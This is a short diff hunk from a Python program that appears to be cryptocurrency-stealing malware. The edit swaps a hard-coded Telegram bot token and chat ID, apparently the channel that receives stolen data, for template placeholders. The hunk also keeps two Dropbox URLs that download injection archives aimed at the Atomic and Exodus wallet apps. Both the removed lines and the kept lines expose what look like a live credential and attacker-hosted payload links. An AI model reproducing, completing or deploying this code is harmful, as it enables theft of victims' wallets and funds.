@@ -23,8 +23,8 @@ from ctypes import *
 from datetime import datetime, time
 
 
-TOKEN = "6412347716:AAFL5wPS5gm0fx28XCBk0D4sxnkAwvBDz6E"
-CHAT_ID = "-1002219378034"
+TOKEN = "%TOKEN%"
+CHAT_ID = "%CHAT_ID%"
 
 atomic_injection_url = "https://www.dropbox.com/scl/fi/qu1h6fqpntoigvacpfrhm/atomic.asar?rlkey=rx4iua0f7ako14z1lew101y6w&st=bk2uzgpm&dl=1"
 exodus_injection_url = "https://www.dropbox.com/scl/fi/36b3tkhpap0mch0b26739/exodus.asar?rlkey=njeph6oedzttpdc16iub88y92&st=qspyggx6&dl=1"
